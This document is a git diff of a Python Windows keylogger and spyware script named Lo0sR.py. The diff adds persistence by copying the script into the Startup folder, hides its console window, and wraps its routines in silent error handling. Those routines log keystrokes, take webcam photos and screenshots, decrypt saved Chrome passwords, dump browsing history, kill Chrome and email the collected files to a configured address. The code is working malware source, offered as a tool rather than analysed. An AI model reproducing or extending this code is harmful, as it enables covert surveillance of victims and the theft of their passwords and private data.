@@ -2,9 +2,11 @@ import os
 import csv
 import time
 import psutil
+import shutil
 import pyHook
 import smtplib
 import sqlite3
+import win32api
 import win32gui
 import mimetypes
 import pythoncom
@@ -22,7 +24,6 @@ from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
 from datetime import datetime, timedelta
 from email.mime.multipart import MIMEMultipart
-
 
 NUMBER_OF_THREADS = 6
 JOB_NUMBER = [1, 2, 3, 4, 5, 6, ]
@@ -44,7 +45,6 @@ f_name = "output.txt"
 interval = 120
 
 # WebCam
-cam = Device()
 # interval in sec
 interval_webcam = 120
 
@@ -52,19 +52,31 @@ interval_webcam = 120
 # MAIL CONFIG
 files = ["output.txt", ]
 
-FromConf = 'your_username@gmail.com'
-ToConf = 'your_username@gmail.com'
+FromConf = 'your_email@gmail.com'
+ToConf = 'your_email@gmail.com'
 passwordConf = 'your_password'
 
 intervalMail = 600
 
 
+# Hides Window
 def hide():
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window, 0)
 hide()
 
 
+# Adds Keylogger to Startup
+def add_to_autostart():
+    path = "C:\\Users\\" + win32api.GetUserName() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+    if os.path.isfile(path + "\Lo0sR.py") == True:  # checks if File already exists in Startup
+        pass
+    else:
+        shutil.move(os.getcwd() + "\\Lo0sR.py", path)  # Moves File to Startup
+add_to_autostart()
+
+
+# Kills Chrome if running
 def kill_chrome():
     for proc in psutil.process_iter():
         try:
@@ -123,6 +135,7 @@ def keydown(event):
             fp.write(data)
             fp.close()
 
+
 def keylogger():
     obj = pyHook.HookManager()
     obj.KeyDown = keydown
@@ -131,16 +144,22 @@ def keylogger():
     pythoncom.PumpMessages()
 
 
+# Take Photo through webcam
 def webcam_pic(interval_w):
 
-    while True:
-        time.sleep(interval_w)
-        cur_time = str(str(time.localtime().tm_year) + "_" + str(time.localtime().tm_mon) + "_" + str(time.localtime().tm_mday) + "_" + str(time.localtime().tm_hour) + "_" + str(time.localtime().tm_min) + "_" + str(time.localtime().tm_sec))
-        scr = "webcam_" + cur_time + ".jpg"
-        files.append(str(scr))
-        cam.saveSnapshot(scr)
+    try:
+        cam = Device()
+        while True:
+            time.sleep(interval_w)
+            cur_time = str(str(time.localtime().tm_year) + "_" + str(time.localtime().tm_mon) + "_" + str(time.localtime().tm_mday) + "_" + str(time.localtime().tm_hour) + "_" + str(time.localtime().tm_min) + "_" + str(time.localtime().tm_sec))
+            scr = "webcam_" + cur_time + ".jpg"
+            files.append(str(scr))
+            cam.saveSnapshot(scr)
+    except Exception as e:
+        pass
 
 
+# Take Screenshot
 def screenshot(interval_scr):
     while True:
         time.sleep(interval_scr)
@@ -150,6 +169,7 @@ def screenshot(interval_scr):
         ImageGrab.grab().save(scr, "PNG")
 
 
+# Send Mail
 def send_mail(From, To, password, intervalM):
 
     while True:
@@ -231,42 +251,49 @@ Output:
 
 def dump_chrome_passwords():
 
-    conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
-    cursor = conn.cursor()
+    try:
+        conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
+        cursor = conn.cursor()
 
-    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-    with open(f_name, 'a') as f:
-        f.write('\n\n\n### All Chrome Passwords ###\n\n\n')
-        f.close()
-    for result in cursor.fetchall():
-        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
-        if password:
-            site = 'Site: ' + result[0]
-            username = 'Username: ' + result[1]
-            password = 'Password: ' + password
-            with open(f_name, 'a') as f:
-                f.write(site + '\n' + username + '\n' + password + '\n\n')
-                f.close()
-    with open(f_name, 'a') as f:
-        f.write('\n\n### END ###\n\n\n')
-        f.close()
+        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+        with open(f_name, 'a') as f:
+            f.write('\n\n\n### Chrome Passwords ###\n\n\n')
+            f.close()
+        for result in cursor.fetchall():
+            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
+            if password:
+                site = 'Site: ' + result[0]
+                username = 'Username: ' + result[1]
+                password = 'Password: ' + password
+                with open(f_name, 'a') as f:
+                    f.write(site + '\n' + username + '\n' + password + '\n\n')
+                    f.close()
+        with open(f_name, 'a') as f:
+            f.write('\n\n### END ###\n\n\n')
+            f.close()
+    except Exception:
+        pass
 
 
+# Dumps chrome history
 def dump_chrome_history():
-    connection = sqlite3.connect(os.getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\history")
-    connection.text_factory = str
-    cur = connection.cursor()
-    output_file = open('chrome_history.csv', 'wb')
-    csv_writer = csv.writer(output_file)
-    headers = ('URL', 'Title', 'Visit Count', 'Date (GMT)')
-    csv_writer.writerow(headers)
-    epoch = datetime(1601, 1, 1)
-    for row in (cur.execute('select url, title, visit_count, last_visit_time from urls')):
-        row = list(row)
-        url_time = epoch + timedelta(microseconds=row[3])
-        row[3] = url_time
-        csv_writer.writerow(row)
-    files.append("chrome_history.csv")
+    try:
+        connection = sqlite3.connect(os.getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\history")
+        connection.text_factory = str
+        cur = connection.cursor()
+        output_file = open('chrome_history.csv', 'wb')
+        csv_writer = csv.writer(output_file)
+        headers = ('URL', 'Title', 'Visit Count', 'Date (GMT)')
+        csv_writer.writerow(headers)
+        epoch = datetime(1601, 1, 1)
+        for row in (cur.execute('select url, title, visit_count, last_visit_time from urls')):
+            row = list(row)
+            url_time = epoch + timedelta(microseconds=row[3])
+            row[3] = url_time
+            csv_writer.writerow(row)
+        files.append("chrome_history.csv")
+    except Exception as e:
+        pass
 
 
 def create_workers():
